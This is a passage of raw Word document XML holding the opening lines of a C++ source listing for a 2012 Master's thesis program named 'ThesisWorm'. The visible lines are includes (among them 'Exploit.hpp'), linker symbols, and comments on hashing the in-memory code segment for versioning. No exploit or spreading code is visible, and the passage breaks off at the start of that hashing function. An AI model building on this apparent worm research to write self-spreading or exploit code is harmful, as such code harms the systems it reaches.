          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// Copyright   : Copyright 2012</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  6 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// Description : Master's Thesis project</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  7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8 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// Requires:    Boost 1.48.0</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  9 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">//                      </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>OpenSSL</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> 1.0.0g (32-bit)</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 10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11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12 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 13 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 14 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="009B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>#define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2E92C7"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>PROGRAM_NAME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ThesisWorm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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15 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 16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&lt;string&gt;</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 17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&lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>iostream</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 18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&lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>sstream</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 19 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 20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&lt;boost/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>filesystem</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>/operations.hpp&gt;</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 21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&lt;boost/lexical_cast.hpp&gt;</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 22 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 23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"Utilities.hpp"</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 24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"logger.hpp"</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 25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"Configuration.hpp"</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 26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"ArgumentParser.hpp"</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 27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"Exploit.hpp"</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 28 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 29 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 30 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">// Filled-in by linker for us to allow us to hash the executable code in-memory for </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>getVersion</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>() method</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 31 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// Helpful guide to how to access the linker symbols was provided by</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 32 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>//      //http://stackoverflow.com/questions/7370407/get-the-start-and-end-address-of-text-section-in-an-executable</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 33 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000E6"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>extern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startOfCodeSegment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34 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000E6"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>extern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endOfCodeSegment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35 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 36 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 37 Logger * logger;</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 38 </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 39 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 40 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 41 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// Uses a little trick to read the code segment of the process in-memory and hashes the raw byte data to give a more</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 42 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>//      consistent version so that the versioning is automatic and doesn't require someone to remember to increment it.</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 43 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// This requires some assistance from the linker script</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 44 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// Also we don't rely on trying to read the program executable on disk because there isn't a portable way to easily do</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 45 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">//      so.  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>argv</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>[0] on Linux or Windows could be faked or missing.  Windows has an API, but it doesn't specify what</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 46 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>//      happens if the process is running and the executable was deleted.</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 47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b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>getVersion</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48         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="2E92C7"/>
